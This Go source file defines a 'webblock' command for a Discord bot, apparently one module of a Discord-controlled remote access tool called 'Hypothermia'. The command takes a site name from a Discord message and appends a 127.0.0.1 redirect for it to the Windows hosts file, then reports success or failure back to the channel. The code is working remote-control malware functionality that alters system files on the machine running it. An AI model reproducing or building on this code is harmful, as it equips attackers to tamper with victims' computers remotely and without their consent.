package commands

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"Hypothermia/src/misc"

	"github.com/bwmarrin/discordgo"
)

const (
	wbUsage string = "[website]"

	wbOpenError        string = "🟥 Failed to open file: %s"
	wbWriteError       string = "🟥 Failed to block website: %s"
	wbBlockedLiaoError string = "🟥 Website is already blocked."

	wbSuccess string = "🟩 Successfully blocked website."
)

func (*WebBlockCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, misc.ERROR_ARGS_ONE, wbUsage), m.Reference())
		return
	}

	website := fmt.Sprintf("127.0.0.1 %s", args[0])

	file, err := os.OpenFile("C:\\Windows\\System32\\drivers\\etc\\hosts", os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(wbOpenError, err), m.Reference())
		return
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if strings.TrimSpace(scanner.Text()) == website {
			s.ChannelMessageSendReply(m.ChannelID, wbBlockedLiaoError, m.Reference())
			return
		}
	}

	_, err = file.WriteString("\n" + website + "\n")
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(wbWriteError, err), m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, wbSuccess, m.Reference())
}

func (*WebBlockCommand) Name() string {
	return "webblock"
}

func (*WebBlockCommand) Info() string {
	return "blocks a website from being accessed"
}

type WebBlockCommand struct{}
